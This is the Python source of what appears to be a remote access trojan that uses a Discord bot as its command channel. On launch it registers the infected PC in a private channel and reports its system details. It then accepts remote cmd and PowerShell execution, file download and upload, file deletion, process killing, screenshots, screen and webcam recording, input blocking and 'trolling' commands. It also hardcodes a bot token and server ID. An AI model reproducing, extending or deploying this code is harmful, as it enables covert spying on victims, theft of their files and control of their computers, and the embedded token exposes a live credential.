import discord
import re
import subprocess
import os
from lib import command_executor, logging_manager, file_system, power_manager, process_manager, screen_record, system_info, task_sheduler_manager, user_input_block, webcam, windows_managment, zip_manager, search, zzz_beeper
import uuid
import hashlib

logging_manager.setup_logger("action.log", "debug.log")


TOKEN = 'MTE3NTEzNDA0MDY1NTkyNTI2OQ.GkAXx7.uipg-AEyMN1Hb2x49KAtbi2JQVfh4GY91BSKZU'
GUILD_ID = '1281711709077110918'  # Die ID des Discord-Servers

# Create intents and enable message_content
intents = discord.Intents.default()
intents.members = True  # Allows access to the server's member list
intents.message_content = True  # Allows access to message content

client = discord.Client(intents=intents)

async def find_or_create_channel(guild):
    channel_name = username_with_uuid().lower()  # Channel-Name auf Kleinbuchstaben setzen
    
    # Alle existierenden Channel durchgehen und die Namen ausgeben
    for channel in guild.text_channels:
        
        # Überprüfen, ob der Name mit dem gewünschten übereinstimmt
        if channel.name.lower() == channel_name:  # Vergleich ohne Berücksichtigung der Groß-/Kleinschreibung
            return channel

    # Wenn kein Channel existiert, einen neuen erstellen
    new_channel = await guild.create_text_channel(name=channel_name)
    print(f"Created new channel: {channel_name}")
    return new_channel




# Function to send long messages (split into chunks of max 2000 characters)
async def send_long_message(channel, message):
    for i in range(0, len(message), 2000):
        await channel.send(message[i:i+2000])
        
# Function to write output to a file and send it
async def send_file_with_output(channel, message):
    filename = "output.txt"
    
    # Write the output to a file with utf-8 encoding
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(message)
    
    # Send the file to the channel
    await channel.send(file=discord.File(filename))

    # Remove the file after sending
    if os.path.exists(filename):
        os.remove(filename)
        
def username_with_uuid():
    # Get the username from the operating system
    username = os.getlogin()
    
    # Get the MAC address of the machine
    mac_address = hex(uuid.getnode())  # Get the MAC address as a hex string
    
    # Generate a deterministic UUID based on the MAC address
    uuid_user = uuid.UUID(hashlib.md5(mac_address.encode()).hexdigest())
    
    # Take only the first 10 characters of the UUID
    uuid_10_chars = str(uuid_user)[:10]
    
    # Return formatted string with PC username and stable UUID (no spaces around the dash)
    return f"{username}-{uuid_10_chars}"



@client.event
async def on_ready():
    print(f'{client.user} is now logged in and ready!')
    
    # Get the server object (Guild)
    guild = discord.utils.get(client.guilds, id=int(GUILD_ID))
    user_channel = await find_or_create_channel(guild)
    print(f"Checked or created channel: {user_channel.name}")

    # Get system information
    sys_info = system_info.get_all_system_info()

    # Format the system info into a readable string
    formatted_output = (
        f"**Complete System Information for {os.getlogin}**\n\n"
        f"**CPU Info**:\n"
        f"  Physical Cores: {sys_info['cpu_info']['physical_cores']}\n"
        f"  Total Cores: {sys_info['cpu_info']['total_cores']}\n"
        f"  Usage: {sys_info['cpu_info']['cpu_usage_percent']}%\n"
        f"  Frequency: {sys_info['cpu_info']['cpu_frequency']} MHz\n\n"
        f"**Memory Info**:\n"
        f"  Total Memory: {sys_info['memory_info']['total_memory_gb']:.2f} GB\n"
        f"  Used Memory: {sys_info['memory_info']['used_memory_gb']:.2f} GB\n"
        f"  Available Memory: {sys_info['memory_info']['available_memory_gb']:.2f} GB\n"
        f"  Memory Usage: {sys_info['memory_info']['memory_usage_percent']}%\n\n"
        f"**Disk Info**:\n"
    )

    # Loop through disk partitions for complete information
    for disk in sys_info['disk_info']:
        formatted_output += (
            f"  **Device**: {disk['device']}\n"
            f"  Mountpoint: {disk['mountpoint']}\n"
            f"  Total: {disk['total_gb']:.2f} GB\n"
            f"  Used: {disk['used_gb']:.2f} GB\n"
            f"  Free: {disk['free_gb']:.2f} GB\n"
            f"  Usage: {disk['usage_percent']}%\n\n"
        )

    # Add network and OS information
    formatted_output += (
        f"**Network Info**:\n"
        f"  Hostname: {sys_info['network_info']['hostname']}\n"
        f"  IP Address: {sys_info['network_info']['ip_address']}\n\n"
        f"**OS Info**:\n"
        f"  System: {sys_info['os_info']['system']}\n"
        f"  Node Name: {sys_info['os_info']['node_name']}\n"
        f"  Release: {sys_info['os_info']['release']}\n"
        f"  Version: {sys_info['os_info']['version']}\n"
        f"  Architecture: {sys_info['os_info']['architecture']}\n\n"
        f"**Timestamp**: {sys_info['timestamp']}"
    )

    # Send the formatted output to the user's channel
    await send_file_with_output(user_channel, formatted_output)


@client.event
async def on_message(message):
    # Ignore messages sent by the bot itself
    if message.author == client.user:
        return

    # Get the server object (Guild)
    guild = discord.utils.get(client.guilds, id=int(GUILD_ID))

    # Find or create the user's specific channel
    user_channel = await find_or_create_channel(guild)

    # Check if the message is in the correct channel
    if message.channel != user_channel:
        return

    # Command to run a regular shell command
    if message.content.startswith('.cmd'):
        matches = re.findall(r'"(.*?)"', message.content)

        if len(matches) >= 1:
            arg1 = matches[0]
            output = command_executor.run_cmd(arg1)
            await user_channel.send(f"This is the command output:")
            await send_file_with_output(user_channel, output)
        else:
            await user_channel.send("Not enough arguments. Please provide at least one argument in quotes.")

    # Command to run a PowerShell command
    if message.content.startswith('.ps'):
        matches = re.findall(r'"(.*?)"', message.content)

        if len(matches) >= 1:
            arg1 = matches[0]
            output = command_executor.run_powershell(arg1)
            await user_channel.send(f"This is the PowerShell command output:")
            await send_file_with_output(user_channel, output)
        else:
            await user_channel.send("Not enough arguments. Please provide at least one argument in quotes.")
            
    # Command to list directory contents
    if message.content.startswith('.list_dir'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            directory = matches[0]
            output = file_system.list_directory(directory)
            await send_file_with_output(user_channel, "\n".join(output) if isinstance(output, list) else output)
        else:
            await user_channel.send("Please provide the directory path in quotes.")

    # Command to copy a file
    if message.content.startswith('.copy_file'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            source, destination = matches
            output = file_system.copy_file(source, destination)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the source and destination paths in quotes.")

    # Command to delete a file
    if message.content.startswith('.delete_file'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            file_path = matches[0]
            output = file_system.delete_file(file_path)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the file path in quotes.")

    # Command to create a file
    if message.content.startswith('.create_file'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            file_path = matches[0]
            output = file_system.create_file(file_path)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the file path in quotes.")

    # Command to rename a file
    if message.content.startswith('.rename_file'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            old_name, new_name = matches
            output = file_system.rename_file(old_name, new_name)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the old and new file names in quotes.")

    # Command to get file info
    if message.content.startswith('.file_info'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            file_path = matches[0]
            output = file_system.get_file_info(file_path)
            await user_channel.send(str(output))
        else:
            await user_channel.send("Please provide the file path in quotes.")

    # Command to create a directory
    if message.content.startswith('.create_dir'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            directory = matches[0]
            output = file_system.create_directory(directory)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the directory path in quotes.")

    # Command to delete a directory
    if message.content.startswith('.delete_dir'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            directory = matches[0]
            output = file_system.delete_directory(directory)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the directory path in quotes.")
         
    # Command to shut down the computer
    if message.content.startswith('.shutdown'):
        await user_channel.send("The system is shutting down...")
        output = power_manager.shutdown()
        await user_channel.send(output)

    # Command to restart the computer
    if message.content.startswith('.restart'):
        await user_channel.send("The system is restarting...")
        output = power_manager.restart()
        await user_channel.send(output)

    # Command to log off the user
    if message.content.startswith('.logoff'):
        await user_channel.send("Logging off the current user...")
        output = power_manager.logoff()
        await user_channel.send(output)

    # Command to put the computer to sleep
    if message.content.startswith('.sleep'):
        await user_channel.send("The system is going to sleep...")
        output = power_manager.sleep()
        await user_channel.send(output)

    # Command to hibernate the computer
    if message.content.startswith('.hibernate'):
        await user_channel.send("The system is entering hibernation mode...")
        output = power_manager.hibernate()
        await user_channel.send(output)   
    
    if message.content.startswith('.status'):
        await user_channel.send("The system is online and functioning properly.")
        
    # Command to list all running processes
    if message.content.startswith('.list_processes'):
        output = process_manager.list_processes()
        await send_file_with_output(user_channel, output)

    # Command to kill a process by name or process ID
    if message.content.startswith('.kill_process'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            process_name_or_id = matches[0]
            output = process_manager.kill_process(process_name_or_id)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the process name or ID in quotes.")

    # Command to start a new process
    if message.content.startswith('.start_process'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            command = matches[0]
            output = process_manager.start_process(command)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the process command in quotes.")
            
    # Command to capture a screenshot and send it without saving permanently
    if message.content.startswith('.screenshot'):
        temp_path = "temp_screenshot.png"  # Temporary file path to save the screenshot
        screen_record.capture_screenshot(temp_path)

        # Send the screenshot as a file attachment
        await user_channel.send(file=discord.File(temp_path))

        # Remove the screenshot after sending it
        if os.path.exists(temp_path):
            os.remove(temp_path)

    # Command to record the screen
    if message.content.startswith('.record_screen'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            output_path = matches[0]
            # You can add more parameters like duration and fps if needed
            output = screen_record.record_screen(output_path)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the file path in quotes for saving the screen recording.")

    # Command to capture screenshots at intervals
    if message.content.startswith('.capture_intervals'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            output_folder = matches[0]
            # You can add more parameters like interval and duration if needed
            output = screen_record.capture_screenshots_interval(output_folder)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the folder path in quotes for saving the interval screenshots.")
            
    # Command to get CPU information
    if message.content.startswith('.cpu_info'):
        output = system_info.get_cpu_info()
        formatted_output = (
            f"**CPU Information**\n"
            f"Physical Cores: {output['physical_cores']}\n"
            f"Total Cores: {output['total_cores']}\n"
            f"Usage: {output['cpu_usage_percent']}%\n"
            f"Frequency: {output['cpu_frequency']} MHz"
        )
        await user_channel.send(formatted_output)

    # Command to get memory information
    if message.content.startswith('.memory_info'):
        output = system_info.get_memory_info()
        formatted_output = (
            f"**Memory Information**\n"
            f"Total Memory: {output['total_memory_gb']:.2f} GB\n"
            f"Used Memory: {output['used_memory_gb']:.2f} GB\n"
            f"Available Memory: {output['available_memory_gb']:.2f} GB\n"
            f"Memory Usage: {output['memory_usage_percent']}%"
        )
        await user_channel.send(formatted_output)

    # Command to get disk information
    if message.content.startswith('.disk_info'):
        output = system_info.get_disk_info()
        formatted_output = "**Disk Information**\n"
        for disk in output:
            formatted_output += (
                f"\n**Device**: {disk['device']}\n"
                f"Mountpoint: {disk['mountpoint']}\n"
                f"Total: {disk['total_gb']:.2f} GB\n"
                f"Used: {disk['used_gb']:.2f} GB\n"
                f"Free: {disk['free_gb']:.2f} GB\n"
                f"Usage: {disk['usage_percent']}%\n"
            )
        await user_channel.send(formatted_output)

    # Command to get network information
    if message.content.startswith('.network_info'):
        output = system_info.get_network_info()
        formatted_output = (
            f"**Network Information**\n"
            f"Hostname: {output['hostname']}\n"
            f"IP Address: {output['ip_address']}"
        )
        await user_channel.send(formatted_output)

    # Command to get OS information
    if message.content.startswith('.os_info'):
        output = system_info.get_os_info()
        formatted_output = (
            f"**OS Information**\n"
            f"System: {output['system']}\n"
            f"Node Name: {output['node_name']}\n"
            f"Release: {output['release']}\n"
            f"Version: {output['version']}\n"
            f"Architecture: {output['architecture']}"
        )
        await user_channel.send(formatted_output)

    # Command to get all system information
    if message.content.startswith('.system_info'):
        output = system_info.get_all_system_info()
        formatted_output = (
            f"**Complete System Information**\n\n"
            f"**CPU Info**:\n"
            f"  Physical Cores: {output['cpu_info']['physical_cores']}\n"
            f"  Total Cores: {output['cpu_info']['total_cores']}\n"
            f"  Usage: {output['cpu_info']['cpu_usage_percent']}%\n"
            f"  Frequency: {output['cpu_info']['cpu_frequency']} MHz\n\n"
            f"**Memory Info**:\n"
            f"  Total Memory: {output['memory_info']['total_memory_gb']:.2f} GB\n"
            f"  Used Memory: {output['memory_info']['used_memory_gb']:.2f} GB\n"
            f"  Available Memory: {output['memory_info']['available_memory_gb']:.2f} GB\n"
            f"  Memory Usage: {output['memory_info']['memory_usage_percent']}%\n\n"
            f"**Disk Info**:\n"
        )
        
        # Loop through disk partitions for complete information
        for disk in output['disk_info']:
            formatted_output += (
                f"  **Device**: {disk['device']}\n"
                f"  Mountpoint: {disk['mountpoint']}\n"
                f"  Total: {disk['total_gb']:.2f} GB\n"
                f"  Used: {disk['used_gb']:.2f} GB\n"
                f"  Free: {disk['free_gb']:.2f} GB\n"
                f"  Usage: {disk['usage_percent']}%\n\n"
            )

        # Add network and OS information
        formatted_output += (
            f"**Network Info**:\n"
            f"  Hostname: {output['network_info']['hostname']}\n"
            f"  IP Address: {output['network_info']['ip_address']}\n\n"
            f"**OS Info**:\n"
            f"  System: {output['os_info']['system']}\n"
            f"  Node Name: {output['os_info']['node_name']}\n"
            f"  Release: {output['os_info']['release']}\n"
            f"  Version: {output['os_info']['version']}\n"
            f"  Architecture: {output['os_info']['architecture']}\n"
            f"**Timestamp**: {output['timestamp']}"
        )

        await send_file_with_output(user_channel, formatted_output)
        
    
    
    # Command to list all scheduled tasks
    if message.content.startswith('.list_tasks'):
        output = task_sheduler_manager.list_tasks()
        await send_file_with_output(user_channel, output)

    # Command to delete a scheduled task
    if message.content.startswith('.delete_task'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            task_name = matches[0]
            output = task_sheduler_manager.delete_task(task_name)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the task name in quotes to delete the task.")

    # Command to run a task immediately
    if message.content.startswith('.run_task'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            task_name = matches[0]
            output = task_sheduler_manager.run_task(task_name)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the task name in quotes to run the task.")
            
        
    # Command to block user input
    if message.content.startswith('.block_input'):
        output = user_input_block.block_input()
        await user_channel.send(output)

    # Command to unblock user input
    if message.content.startswith('.unblock_input'):
        output = user_input_block.unblock_input()
        await user_channel.send(output)

            
    
    # Command to capture an image from the webcam and send it without saving permanently
    if message.content.startswith('.capture_image'):
        temp_path = "temp_webcam_image.png"  # Temporary file path to save the image
        webcam.capture_webcam_image(temp_path)

        # Send the image as a file attachment
        await user_channel.send(file=discord.File(temp_path))

        # Remove the image after sending it
        if os.path.exists(temp_path):
            os.remove(temp_path)
            
            
    # Command to record a video from the webcam
    if message.content.startswith('.record_video'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            output_path = matches[0]
            duration = 10  # Default duration of 10 seconds
            fps = 20  # Default FPS of 20

            # Optional: Provide duration and fps as additional arguments in quotes
            if len(matches) >= 2:
                try:
                    duration = int(matches[1])
                except ValueError:
                    await user_channel.send("Invalid duration, using default of 10 seconds.")
            
            if len(matches) >= 3:
                try:
                    fps = int(matches[2])
                except ValueError:
                    await user_channel.send("Invalid FPS, using default of 20 FPS.")

            output = webcam.record_webcam_video(output_path, duration, fps)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the output file path in quotes.")
            
    # Command to get the currently active (foreground) window
    if message.content.startswith('.get_foreground_window'):
        output = windows_managment.get_foreground_window()
        await user_channel.send(output)

    # Command to list all open windows
    if message.content.startswith('.list_open_windows'):
        output = windows_managment.list_open_windows()
        await send_file_with_output(user_channel, "\n".join(output))

    # Command to bring a window to the foreground
    if message.content.startswith('.bring_window'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            window_title = matches[0]
            output = windows_managment.bring_window_to_foreground(window_title)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the window title in quotes.")

    # Command to minimize a window
    if message.content.startswith('.minimize_window'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            window_title = matches[0]
            output = windows_managment.minimize_window(window_title)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the window title in quotes.")

    # Command to maximize a window
    if message.content.startswith('.maximize_window'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            window_title = matches[0]
            output = windows_managment.maximize_window(window_title)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the window title in quotes.")

    # Command to close a window
    if message.content.startswith('.close_window'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            window_title = matches[0]
            output = windows_managment.close_window(window_title)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the window title in quotes.")
            
    # Command to zip a file
    if message.content.startswith('.zip_file'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            file_path, zip_name = matches
            output = zip_manager.zip_file(file_path, zip_name)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the file path and zip file name in quotes.")

    # Command to zip a directory
    if message.content.startswith('.zip_directory'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            directory_path, zip_name = matches
            output = zip_manager.zip_directory(directory_path, zip_name)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the directory path and zip file name in quotes.")

    # Command to extract a zip file
    if message.content.startswith('.extract_zip'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            zip_path, extract_to = matches
            output = zip_manager.extract_zip(zip_path, extract_to)
            await user_channel.send(output)
        else:
            await user_channel.send("Please provide the zip file path and extract destination in quotes.")

    # Command to list contents of a zip file
    if message.content.startswith('.list_zip_contents'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            zip_path = matches[0]
            output = zip_manager.list_zip_contents(zip_path)
            await send_file_with_output(user_channel, "\n".join(output) if isinstance(output, list) else output)
        else:
            await user_channel.send("Please provide the zip file path in quotes.")
            
    # Command to download a specific file from the PC
    if message.content.startswith('.download_file'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            file_path = matches[0]
            if os.path.exists(file_path):
                await user_channel.send(file=discord.File(file_path))
            else:
                await user_channel.send("File not found. Please provide a valid file path.")
        else:
            await user_channel.send("Please provide the file path in quotes.")

    # Command to upload an attached file to the PC
    if message.content.startswith('.upload_file'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 1:
            save_path = matches[0]
            if message.attachments:
                attachment = message.attachments[0]
                file_data = await attachment.read()
                with open(save_path, 'wb') as f:
                    f.write(file_data)
                await user_channel.send(f"File uploaded successfully and saved to: {save_path}")
            else:
                await user_channel.send("No file attached. Please attach a file to upload.")
        else:
            await user_channel.send("Please provide the save path in quotes.")        
    
    # Search by file extension
    if message.content.startswith('.search_extension'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            directory, extension = matches
            results = search.search_by_extension(directory, extension)
            await send_file_with_output(user_channel, "\n".join(results) if results else "No results found.")
        else:
            await user_channel.send("Please provide the directory and file extension in quotes.")

    # Search by filename pattern
    if message.content.startswith('.search_filename'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            directory, file_name_pattern = matches
            results = search.search_by_filename(directory, file_name_pattern)
            await send_file_with_output(user_channel, "\n".join(results) if results else "No results found.")
        else:
            await user_channel.send("Please provide the directory and file name pattern in quotes.")

    # Search by folder name
    if message.content.startswith('.search_folder'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            directory, folder_name = matches
            results = search.search_by_foldername(directory, folder_name)
            await send_file_with_output(user_channel, "\n".join(results) if results else "No results found.")
        else:
            await user_channel.send("Please provide the directory and folder name in quotes.")

    # Search by file content
    if message.content.startswith('.search_content'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            directory, search_content = matches
            results = search.search_by_file_content(directory, search_content)
            await send_file_with_output(user_channel, "\n".join(results) if results else "No results found.")
        else:
            await user_channel.send("Please provide the directory and content to search in quotes.")
            
            
    # trolling
    if message.content.startswith('.beep_loop'):
        matches = re.findall(r'"(.*?)"', message.content)
        if len(matches) >= 2:
            interval,  duration= matches
            results = zzz_beeper.start_beep_thread(interval, duration)
            await user_channel.send(f"beep started for {duration} and with intverval of: {interval}")
        else:
            await user_channel.send("Please provide interval and duration")
    
        
    # Command to display help information
    if message.content.startswith('.help'):
        # Message 1: System and File System Commands
        help_message_1 = """
        **1. System Commands**
        • `.shutdown` - Shuts down the computer.
        • `.restart` - Restarts the computer.
        • `.logoff` - Logs off the current user.
        • `.sleep` - Puts the computer to sleep.
        • `.hibernate` - Puts the computer into hibernation.
        • `.status` - Checks if the system is online and responding.

        **2. File System Commands**
        • `.list_dir "directory_path"` - Lists contents of the specified directory.
        • `.copy_file "source_path" "destination_path"` - Copies a file from source to destination.
        • `.delete_file "file_path"` - Deletes the specified file.
        • `.create_file "file_path"` - Creates an empty file at the specified path.
        • `.rename_file "old_name" "new_name"` - Renames a file.
        • `.file_info "file_path"` - Retrieves file metadata (size, last modified time).
        • `.create_dir "directory_path"` - Creates a directory.
        • `.delete_dir "directory_path"` - Deletes a directory and its contents.
        """
        await user_channel.send(help_message_1)

        # Message 2: Process Management, Screen, and System Info Commands
        help_message_2 = """
        **3. Process Management Commands**
        • `.list_processes` - Lists all running processes.
        • `.kill_process "process_name_or_id"` - Kills a specific process by name or ID.
        • `.start_process "command"` - Starts a new process with the specified command.

        **4. Screen Commands**
        • `.screenshot ` - Captures a screenshot and sends it.
        • `.record_screen "output_path"` - Records the screen and saves the video to the specified path.
        • `.capture_intervals "output_folder"` - Captures screenshots at intervals and saves them in the specified folder.

        **5. System Info Commands**
        • `.cpu_info` - Retrieves CPU details.
        • `.memory_info` - Retrieves memory details.
        • `.disk_info` - Retrieves disk information.
        • `.network_info` - Retrieves network details.
        • `.os_info` - Retrieves OS details.
        • `.system_info` - Retrieves all system information.
        """
        await user_channel.send(help_message_2)

        # Message 3: Task Scheduler, Trolling, and Input Blocking Commands
        help_message_3 = """
        **6. Task Scheduler Commands**
        • `.create_task "task_name" "command" "start_time" ["interval"]` - Creates a scheduled task in Windows Task Scheduler.
        • `.list_tasks` - Lists all scheduled tasks.
        • `.delete_task "task_name"` - Deletes a specific scheduled task by name.
        • `.run_task "task_name"` - Runs a scheduled task immediately by name.

        **7. Trolling Commands**
        • `.beep_loop "interval" "duration"` - starts a thread with a beeper for a duration

        **8. User Input Blocking Commands**
        • `.block_input` - Blocks all keyboard and mouse input.
        • `.unblock_input` - Unblocks all keyboard and mouse input.
        """
        await user_channel.send(help_message_3)

        # Message 4: Webcam, Window Management, Zip, and File Transfer Commands
        help_message_4 = """
        **9. Webcam Commands**
        • `.capture_image ` - Captures a single webcam image and sends it.
        • `.record_video "output_path" [duration] [fps]` - Records a video from the webcam and saves it to the specified path.

        **10. Window Management Commands**
        • `.get_foreground_window` - Retrieves the currently active (foreground) window.
        • `.list_open_windows` - Lists all currently open windows on the system.
        • `.bring_window "window_title"` - Brings a window to the foreground based on its title.
        • `.minimize_window "window_title"` - Minimizes a window based on its title.
        • `.maximize_window "window_title"` - Maximizes a window based on its title.
        • `.close_window "window_title"` - Closes a window based on its title.

        **11. Zip Management Commands**
        • `.zip_file "file_path" "zip_name"` - Compresses a single file into a zip archive.
        • `.zip_directory "directory_path" "zip_name"` - Compresses an entire directory into a zip archive.
        • `.extract_zip "zip_path" "extract_to"` - Extracts a zip file to the specified directory.
        • `.list_zip_contents "zip_path"` - Lists the contents of a zip file without extracting it.

        **12. File Transfer Commands**
        • `.download_file "file_path"` - Downloads a file from the PC and sends it as an attachment.
        • `.upload_file "save_path"` - Uploads a file attached to the message and saves it to the specified path.
        """
        await user_channel.send(help_message_4)
        
        # Message 5: Search Commands
        help_message_5 = """
        **13. Search Commands**
        • `.search_extension "directory" "file_extension"` - Search for files by extension in a given directory.
        • `.search_filename "directory" "file_name_pattern"` - Search for files by name pattern (supports wildcards).
        • `.search_folder "directory" "folder_name"` - Search for folders by name in a given directory.
        • `.search_content "directory" "search_content"` - Search for specific content inside files within a directory.
        """
        await user_channel.send(help_message_5)

    
    


# Start the bot
client.run(TOKEN)